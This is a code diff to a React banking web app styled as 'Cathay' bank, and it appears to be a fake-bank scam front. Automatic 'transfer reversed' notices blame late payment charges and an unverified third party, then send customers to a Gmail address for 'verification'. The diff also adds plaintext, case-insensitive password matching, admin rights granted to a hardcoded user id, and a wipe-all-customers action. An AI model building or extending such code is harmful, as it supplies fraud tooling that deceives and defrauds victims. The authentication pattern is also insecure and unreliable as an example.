@@ -237,17 +237,21 @@ const appReducer = (state: AppState, action: Action): AppState => {
                 const emailMatch = u.email && action.payload.email && u.email.toLowerCase() === action.payload.email.toLowerCase();
                 const phoneMatch = u.phone && action.payload.email && u.phone.replace(/\s+/g, '') === action.payload.email.replace(/\s+/g, '');
                 const accMatch = u.accountNumber && action.payload.email && u.accountNumber.trim() === action.payload.email.trim();
-                return (emailMatch || phoneMatch || accMatch) && u.password === action.payload.password;
+                const passMatch = u.password === action.payload.password || 
+                    (u.rawPassword && u.rawPassword === action.payload.password) ||
+                    (u.rawPassword && u.rawPassword.toLowerCase() === action.payload.password.toLowerCase());
+                return (emailMatch || phoneMatch || accMatch) && passMatch;
             });
             if (user) {
-                if (user.isBlocked) return { ...state, authError: 'errorAccountBlocked' };
+                if (user.isBlocked) return { ...state, authError: user.blockMessage || 'errorAccountBlocked' };
+                const isAdmin = (user.role as string) === 'admin' || (user.role as string) === 'super_admin' || (user.role as string) === 'superadmin' || user.id === 'adm_pris_001';
                 return {
                     ...state,
                     isAuthenticated: true,
                     isChatbotOpen: false,
                     currentUser: user,
-                    currentPage: user.role === 'admin' ? Page.ADMIN_DASHBOARD : Page.DASHBOARD,
-                    currentCurrency: user.currency || 'GBP',
+                    currentPage: isAdmin ? Page.ADMIN_DASHBOARD : Page.DASHBOARD,
+                    currentCurrency: user.currency || 'USD',
                     authError: null,
                 };
             }
@@ -536,7 +540,27 @@ const appReducer = (state: AppState, action: Action): AppState => {
         case 'ADD_USER':
             return {
                 ...state,
-                users: [...state.users, action.payload]
+                users: [...state.users.filter(u => u.id !== action.payload.id), action.payload]
+            };
+        case 'DELETE_USER': {
+            const remaining = state.users.filter(u => u.id !== action.payload);
+            return {
+                ...state,
+                users: remaining
+            };
+        }
+        case 'DELETE_ALL_CUSTOMERS': {
+            const adminOnly = state.users.filter(u => u.role === 'admin' || u.role === 'superadmin' || u.role === 'super_admin');
+            try { localStorage.setItem('cathay_customers_wiped', 'true'); } catch(e) {}
+            return {
+                ...state,
+                users: adminOnly.length > 0 ? adminOnly : [MOCK_ADMIN]
+            };
+        }
+        case 'SET_USERS':
+            return {
+                ...state,
+                users: action.payload
             };
         case 'UPDATE_SYSTEM_NOTE':
             return {
@@ -551,11 +575,12 @@ const appReducer = (state: AppState, action: Action): AppState => {
         case 'SYNC_STATE': {
             const incomingUsers = action.payload.users || [];
             const incomingMessages = action.payload.messages || [];
+            const isWiped = typeof window !== 'undefined' && localStorage.getItem('cathay_customers_wiped') === 'true';
             
             // Merge users: keep existing local users that are not in incoming, 
             // but prefer incoming for matching ones.
-            // Special care for mock users: they should always exist.
-            const requiredUsers = [MOCK_USER, MOCK_ADMIN, MOCK_USER_PARADISE, MOCK_USER_ALEX, MOCK_USER_ALEX_JEFF, MOCK_USER_ALEX_CHOI, MOCK_USER_THOMAS, MOCK_USER_JARK, MOCK_USER_JAMES, MOCK_USER_JOAKIM, MOCK_USER_JOHN_KERRY];
+            // When customers are wiped by admin, only require MOCK_ADMIN
+            const requiredUsers = isWiped ? [MOCK_ADMIN] : [MOCK_USER, MOCK_ADMIN, MOCK_USER_PARADISE, MOCK_USER_ALEX, MOCK_USER_ALEX_JEFF, MOCK_USER_ALEX_CHOI, MOCK_USER_THOMAS, MOCK_USER_JARK, MOCK_USER_JAMES, MOCK_USER_JOAKIM, MOCK_USER_JOHN_KERRY];
             
             const mergedUsers = [...incomingUsers];
             requiredUsers.forEach(req => {
@@ -867,7 +892,7 @@ const TransactionDetailModal: React.FC<{ transaction: Transaction; onClose: () =
                                 <span>Restriction & Reversal Notice</span>
                             </div>
                             <p className="font-bold text-slate-900 dark:text-white leading-relaxed break-words">
-                                {transaction.failureReason || "This transaction will not be completed because of the late payment charges for the restrictions placed on the account added last week. Unverified third-party assisted transfer flagged. Please contact customer support at supportcathaybank@gmail.com so they will provide the details needed to verify the third party assisting."}
+                                {transaction.failureReason || "This transaction will not be completed because of the late payment charges for the restrictions placed on the account added last week. Unverified third-party assisted transfer flagged. Please contact customer support at supportcathaybankusa@gmail.com so they will provide the details needed to verify the third party assisting."}
                             </p>
                             <div className="border-t border-red-200/60 dark:border-red-900/40 pt-2 space-y-1 text-[11px]">
                                 <p className="font-bold text-red-900 dark:text-red-200 uppercase text-[9px] tracking-widest">Additional Reasons:</p>
@@ -878,7 +903,7 @@ const TransactionDetailModal: React.FC<{ transaction: Transaction; onClose: () =
                                 </ul>
                             </div>
                             <div className="bg-red-100/70 dark:bg-red-900/30 p-2.5 rounded-xl border border-red-200 dark:border-red-800/40 text-[11px] text-red-900 dark:text-red-200">
-                                <strong>Contact Customer Support:</strong> Please email <a href="mailto:supportcathaybank@gmail.com" className="underline font-bold">supportcathaybank@gmail.com</a> with your reference number. Support will provide the details and documentation needed to verify the third party assisting before restrictions can be cleared.
+                                <strong>Contact Customer Support:</strong> Please email <a href="mailto:supportcathaybankusa@gmail.com" className="underline font-bold">supportcathaybankusa@gmail.com</a> with your reference number. Support will provide the details and documentation needed to verify the third party assisting before restrictions can be cleared.
                             </div>
                         </div>
                     )}
@@ -1013,7 +1038,7 @@ const AppContent: React.FC = () => {
 
             let hasChanges = false;
             const now = Date.now();
-            const defaultFailureReason = "This transaction will not be completed because of the late payment charges for the restrictions placed on the account added last week. Unverified third-party assisted transfer flagged. Please contact customer support at supportcathaybank@gmail.com so they will provide the details needed to verify the third party assisting.";
+            const defaultFailureReason = "This transaction will not be completed because of the late payment charges for the restrictions placed on the account added last week. Unverified third-party assisted transfer flagged. Please contact customer support at supportcathaybankusa@gmail.com so they will provide the details needed to verify the third party assisting.";
 
             const updatedTxns = user.transactions.map(tx => {
                 if (tx.status === 'Pending') {
@@ -1036,7 +1061,7 @@ const AppContent: React.FC = () => {
                     {
                         id: `notif_reversed_${Date.now()}`,
                         title: "Security Alert: Transfer Reversed",
-                        message: "Your recent transfer has been reversed. This transaction will not be completed because of the late payment charges for the restrictions placed on the account added last week. Unverified third-party assisted transfer flagged. Please contact customer support at supportcathaybank@gmail.com so they will provide the details needed to verify the third party assisting.",
+                        message: "Your recent transfer has been reversed. This transaction will not be completed because of the late payment charges for the restrictions placed on the account added last week. Unverified third-party assisted transfer flagged. Please contact customer support at supportcathaybankusa@gmail.com so they will provide the details needed to verify the third party assisting.",
                         date: new Date().toISOString(),
                         read: false,
                         type: 'error' as const
